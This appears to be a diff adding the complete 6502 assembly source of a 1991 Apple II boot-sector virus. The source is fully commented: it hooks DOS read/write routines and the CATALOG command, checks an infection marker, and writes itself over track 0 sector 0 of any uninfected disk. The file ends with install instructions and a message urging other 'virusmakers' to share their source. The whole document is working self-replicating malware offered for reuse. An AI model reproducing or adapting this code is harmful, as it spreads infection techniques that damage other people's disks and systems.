@@ -1,0 +1,343 @@
+********************************
+*                              *
+*  BOOT VIRUS BY THE SHARK     *
+*  (C) 1991 AKMSOFT CO. LTD    *
+*  YOUR APPLE NOW STONED !!!   *
+*                              *
+*  GREETINGS FOR DARK AVENGER  *
+********************************
+*
+H084D = $084D
+H08FE = $08FE
+H08FF = $08FF
+H964B = $964B
+RESTORE = $FF3F
+COLDDOS = $9D84
+HA2AA = $A2AA
+HB748 = $B748
+HB749 = $B749
+RWTSENTR = $B7B5
+IOBTRACK = $B7EC
+IOBSECTOR = $B7ED
+BUFFERL = $B7F0
+BUFFERH = $B7F1
+MODE = $B7F4
+VOLUME = $B7EB
+INIT = $FB2F
+SETKBD = $FE89
+SETVID = $FE93
+SAVE = $FF4A
+*
+ ORG $800
+*
+ HEX 01
+*
+********************************
+*                              *
+* THIS IS STANDART BOOT PROGRAM*
+*                              *
+********************************
+*
+ LDA $27
+ CMP #$09
+ BNE H501F
+ LDA $2B
+********************************
+*                              *
+* LSR A FOR CALCULATE THE SLOT *
+*                              *
+********************************
+*
+ LSR
+ LSR
+ LSR
+ LSR
+ ORA #$C0
+ STA $3F
+ LDA #$5C
+ STA $3E
+ CLC
+ LDA H08FE
+ ADC H08FF
+ STA H08FE
+H501F LDX H08FF
+ BMI H5039
+ LDA H084D,X
+ STA $3D
+ DEC H08FF
+ LDA H08FE
+ STA $27
+ DEC H08FE
+ LDX $2B
+ JMP ($003E)
+H5039 INC H08FE
+ INC H08FE
+ JSR SETKBD
+ JSR SETVID
+ JSR INIT
+********************************
+*                              *
+* JUMP TO BEGIN OF VIRUS       *
+*                              *
+********************************
+*
+ JMP BEGIN
+********************************
+*                              *
+*        TABLE OF BOOT         *
+*                              *
+********************************
+*
+ HEX 00
+********************************
+*                              *
+* MARKER - IF DISK IS INFECTED *
+* IF NO INFECTED THERE IS OTHER*
+*                              *
+********************************
+*
+ ASC "A"
+********************************
+*
+ HEX 00
+ HEX 0D
+ HEX 0B
+ HEX 09
+ HEX 07
+ HEX 05
+ HEX 03
+ HEX 01
+ HEX 0E
+ HEX 0C
+ HEX 0A
+ HEX 08
+ HEX 06
+ HEX 04
+ HEX 02
+ HEX 0F
+ HEX 00
+********************************
+*                              *
+*        END OF TABLE !        *
+*                              *
+********************************
+*
+********************************
+*                              *
+* BEGIN OF VIRUS               *
+*                              *
+********************************
+*
+********************************
+*                              *
+* CHANGE IN RWTS ADRESS TO     *
+*RETURN IN VIRUS AFTER LOAD DOS*
+*                              *
+********************************
+*
+BEGIN LDA #CATCH
+ STA HB748
+ LDA #>CATCH
+ STA HB749
+********************************
+*                              *
+* JUMP TO LOAD DOS             *
+*                              *
+********************************
+*
+ LDX $2B
+ JMP ($08FD)
+********************************
+*                              *
+* MOVE VIRUS IN ADRESS $9900   *
+* MOVSB 251D                   *
+*                              *
+********************************
+CATCH LDX #$00
+ STX BUFFERL
+LOOP LDA $0800,X
+ STA $9900,X
+ INX
+ BNE LOOP
+********************************
+*                              *
+* RESTORE BUFFER FOR LOAD DOS  *
+*                              *
+********************************
+*
+ DEC $99FE
+********************************
+*                              *
+* JUMP TO NEW ADRESS OF VIRUS  *
+* $9900                        *
+*                              *
+********************************
+ JMP VIRBEG
+********************************
+********************************
+* BEGIN PROGRAM CODE OF VIRUS  *
+********************************
+********************************
+*
+ ORG $9981
+*
+********************************
+*                              *
+* GET "CATALOG ENTRY PONT AND  *
+* CHANGE IT VIRUS ENTRY POINT  *
+*                              *
+********************************
+*
+VIRBEG LDA #LOOK
+ STA $A571
+ LDA #>LOOK
+ STA $A572
+********************************
+*                              *
+* RESTORE NUMBER OF SECTORS FOR*
+* READ 09                      *
+*                              *
+********************************
+*
+ LDA #9
+ STA $99FF
+********************************
+*                              *
+* READ TARCK 2 SECTOR 0C       *
+* STANDART BOOT SECTOR         *
+*                              *
+********************************
+*                              *
+ LDA #$0C
+ STA IOBSECTOR
+ LDA #$02
+ STA IOBTRACK
+ LDA #$B6
+ STA BUFFERH
+ JSR READ
+ JMP COLDDOS
+********************************
+*                              *
+* VIRUS (CATALOG) ENTRY POINT  *
+*                              *
+********************************
+*
+LOOK PHA
+********************************
+*                              *
+* READ TRACK 0 SECTOR 0        *
+*                              *
+********************************
+*
+ LDA #$00
+ STA IOBTRACK
+ STA IOBSECTOR
+ STA BUFFERL
+ JSR READ1
+********************************
+*                              *
+* IF IN ADRESS $964B HAVE "A"  *
+* THEN DISK IS INFECTED END    *
+*                              *
+********************************
+*
+ LDA H964B
+ BEQ ENDV
+********************************
+*                              *
+* ELSE WRITE VIRUS INTO        *
+* TRACK 0 SECTOR 0             *
+*                              *
+********************************
+*
+ LDA #$99
+ STA BUFFERH
+ JSR WRITE
+********************************
+*                              *
+* WRITE STANDART BOOT SECTOR   *
+* IN TRACK 2 SECTOR $0C        *
+*                              *
+********************************
+*
+ LDA #$02
+ STA IOBTRACK
+ LDA #$0C
+ STA IOBSECTOR
+ LDA #$96
+ STA BUFFERH
+ JSR WRITE
+********************************
+*                              *
+* GOTO "CATALOG" END VIRUS     *
+*                              *
+********************************
+*
+ENDV PLA
+ JMP HA2AA
+********************************
+*                              *
+* THIS PROGRAM READ SECTOR     *
+*                              *
+********************************
+*
+READ1 LDA #$96
+ STA BUFFERH
+READ LDA #$01
+ JSR SET
+ BCS READ
+ RTS
+********************************
+*                              *
+* THIS PART OF PROGRAM WRITE   *
+* SECTOR                       *
+*                              *
+********************************
+*
+WRITE LDA #$02
+SET STA MODE
+ LDA #$00
+ STA VOLUME
+ STA BUFFERL
+ LDA #$B7
+ LDY #$E8
+ JSR RWTSENTR
+********************************
+*                              *
+* CLEAR DOS TRAP $48           *
+*                              *
+********************************
+*
+ LDA #$00
+ STA $48
+ RTS
+ HEX 00
+ HEX B6
+ HEX 09
+
+********************************
+*                              *
+* HOW TO INSTALL ?             *
+*FIRST ASSEMBLY VIRUS IN ADRESS*
+*$9900 (OBJ CODE MUST BY IN    *
+*$9900 )                       *
+*THEN TYPE FROM MONITOR        *
+*($9981G)                      *
+*INSERT DISK WITH DOS AND TYPE *
+*"CATALOG" - DISK IS INFECTED  *
+*                              *
+********************************
+*
+********************************
+*                              *
+*NOTE:                         *
+*FOR ALL VIRUSMAKEERS          *
+*WRITE IN YOUR VIRUSES FULL    *
+*INFORMATION FOR VIRUS WORK    *
+*THIS IS HELP FOR ANOTHER      *
+*VIRUSMAKEERS AND GIVE YOUR    *
+*SOURCE ASM -FILE  TO EVERYBODY*
+*GOOD LUCK !!                  *
+*                              *
+*                              *
+********************************
